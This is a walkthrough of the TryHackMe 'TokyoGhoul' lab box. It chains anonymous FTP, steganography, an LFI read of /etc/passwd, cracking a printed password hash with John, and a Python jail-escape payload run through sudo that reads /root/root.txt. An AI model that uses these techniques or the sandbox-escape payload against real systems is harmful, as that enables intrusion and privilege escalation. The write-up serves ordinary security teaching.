# TokyoGhoul — TryHackMe Writeup

A walkthrough of **TokyoGhoul**, a medium-difficulty Linux machine on TryHackMe. The box chains anonymous FTP access, binary string analysis, steganography, morse code decoding, Local File Inclusion, hash cracking, and a Python sandbox escape to achieve root.

---

## Table of Contents

- [Machine Information](#machine-information)
- [Reconnaissance](#reconnaissance)
  - [Full Port Scan](#full-port-scan)
  - [Service and Version Detection](#service-and-version-detection)
- [Enumeration](#enumeration)
  - [Anonymous FTP Access](#anonymous-ftp-access)
  - [Web Enumeration](#web-enumeration)
- [Initial Foothold](#initial-foothold)
  - [Binary String Analysis](#binary-string-analysis)
  - [Steganography Extraction](#steganography-extraction)
  - [Directory Discovery](#directory-discovery)
  - [Local File Inclusion](#local-file-inclusion)
  - [Hash Cracking](#hash-cracking)
  - [Gaining SSH Access](#gaining-ssh-access)
- [Privilege Escalation](#privilege-escalation)
- [Summary](#summary)

---

## Machine Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Linux |
| Target IP | `10.48.135.76` |

---

## Reconnaissance

### Full Port Scan

An initial all-port Nmap scan was run against the target to identify open services.

```text
Nmap scan report for ip-10-48-135-76.ap-south-1.compute.internal (10.48.135.76)
Host is up, received reset ttl 64 (0.00038s latency).
Scanned at 2026-11-20 03:10:18 UTC for 2s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Three open ports were identified: **FTP (21)**, **SSH (22)**, and **HTTP (80)**.

### Service and Version Detection

A follow-up scan with service and version detection was run to fingerprint each open port.

```text
Nmap scan report for ip-10-48-135-76.ap-south-1.compute.internal (10.48.135.76)
Host is up, received reset ttl 64 (0.00064s latency).
Scanned at 2026-11-20 03:11:20 UTC for 6s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.48.96.199
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Key findings:

- **FTP** — `vsftpd 3.0.3` with **anonymous login allowed**.
- **SSH** — `OpenSSH 7.2p2` on Ubuntu.
- **HTTP** — `Apache httpd 2.4.18` serving a page titled "Welcome To Tokyo goul".

---

## Enumeration

### Anonymous FTP Access

Since anonymous FTP login was permitted, the FTP service was accessed directly.

```text
ftp> ls
229 Entering Extended Passive Mode (|||48073|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
```

Navigating into the `Talk_with_me` directory revealed two additional files:

```text
ftp> ls
229 Entering Extended Passive Mode (|||46456|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
```

A review of the available files surfaced several candidate usernames for later use: `kamishiro`, `jason`, `kagune`, and `kaneki`.

### Web Enumeration

Browsing the web application in Burp Suite led to the following page:

```
http://10.48.135.76/jasonroom.html
```

The page's HTML source contained a hidden comment:

```html
<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->
```

This hinted that the `need_to_talk` binary retrieved from FTP was the "friend" referenced in the comment.

---

## Initial Foothold

### Binary String Analysis

Running `strings` against the `need_to_talk` executable exposed embedded text resembling a simple authentication flow:

```text
strings need_to_talk
```

```text
You_founH
d_1t
[]A\A]A^A_
kamishiro
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
```

Supplying the earlier-identified username as the passphrase prompted the program to reveal a value:

```text
> kamishiro
Good job. I believe this is what you came for:
You_found_1t
```

### Steganography Extraction

The recovered string `You_found_1t` was used as the passphrase to extract hidden data from the image file retrieved earlier via FTP, using `steghide`.

```bash
steghide extract -sf rize_and_kaneki.jpg
```

```text
Enter passphrase:
wrote extracted data to "yougotme.txt"
```

The extracted file contained a message encoded in Morse code. Decoding it revealed a hidden directory name:

```
d1r3c70ry_center
```

### Directory Discovery

With the hidden directory name in hand, `gobuster` was used to enumerate further content within it:

```bash
gobuster dir -u http://10.48.135.76/d1r3c70ry_center/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x txt,php,zip,bak,sql,sqlite,tar,tgz,tar.gz
```

The discovered page prompted the user to answer a yes/no question. Any response redirected to an index page that was vulnerable to Local File Inclusion.

### Local File Inclusion

The `index.php` page accepted a `view` parameter that could be manipulated to read arbitrary files on the server:

```
http://10.48.135.76/d1r3c70ry_center/claim/index.php?view=flower.gif
```

By adjusting the `view` parameter with standard LFI path traversal techniques, the contents of `/etc/passwd` were retrieved, revealing a user hash:

```text
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

This confirmed the `kamishiro` username identified earlier and provided a password hash to crack.

### Hash Cracking

The hash was saved locally and cracked offline using John the Ripper with the `rockyou.txt` wordlist.

```bash
nano hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
password123
```

The cracked credential was: **`password123`**

### Gaining SSH Access

With valid credentials (`kamishiro` / `password123`), an SSH session was established, granting access to the user flag.

```text
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt
```

---

## Privilege Escalation

With a foothold established, `sudo -l` was run to enumerate privilege escalation opportunities.

```text
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro:
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

The user was permitted to run `jail.py`, a restricted Python "sandbox," as root via `sudo`. Launching it presented a restricted prompt:

```text
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>>
```

The sandbox was escaped by dynamically resolving the blocked `os.system` call through `__builtins__.__dict__`, bypassing a filter on the literal string `os.system`:

```python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```

This executed `os.system('cat /root/root.txt')` with root privileges, returning the contents of the root flag.

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full port scan and service/version detection |
| Enumeration | Anonymous FTP access, HTML source review |
| Foothold | Binary string analysis, steganography, Morse decoding, directory brute-forcing, LFI, hash cracking |
| Privilege Escalation | Restricted Python sandbox escape via `sudo` misconfiguration |

**Attack chain overview:**

1. Anonymous FTP exposed a binary and an image file.
2. The binary accepted a username as a passphrase, revealing a steganography key.
3. The image's hidden data (Morse code) pointed to a hidden web directory.
4. That directory led to an LFI vulnerability, exposing `/etc/passwd`.
5. The leaked hash was cracked offline to obtain SSH credentials.
6. A misconfigured `sudo` rule allowed execution of a restricted Python script.
7. The sandbox's string-based filter was bypassed using dynamic attribute lookups, enabling arbitrary command execution as root.

---

*This writeup documents a deliberately vulnerable machine created for educational purposes on TryHackMe. Techniques described apply only to this lab environment.*

# Jai Shri Ram
